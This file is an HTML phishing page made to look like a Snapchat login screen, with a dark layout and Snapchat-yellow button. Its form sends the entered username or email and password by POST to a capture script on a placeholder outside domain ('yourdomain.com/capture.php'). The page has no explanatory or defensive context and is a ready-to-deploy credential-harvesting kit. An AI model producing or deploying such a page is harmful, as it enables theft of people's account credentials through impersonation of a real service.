<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Log In | Snapchat</title>
  <style>
    body { background-color: #000; color: #fff; font-family: Arial, sans-serif; }
    .login-container { max-width: 300px; margin: 100px auto; padding: 20px; background: #222; border-radius: 8px; }
    input { width: 100%; padding: 10px; margin: 10px 0; border-radius: 4px; border: none; }
    button { width: 100%; padding: 10px; background: #fffc00; border: none; font-weight: bold; cursor: pointer; }
  </style>
</head>
<body>
  <div class="login-container">
    <h2>Log In to Snapchat</h2>
    <form action="https://yourdomain.com/capture.php" method="POST">
      <input type="text" name="username" placeholder="Username or Email" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Log In</button>
    </form>
  </div>
</body>
</html>
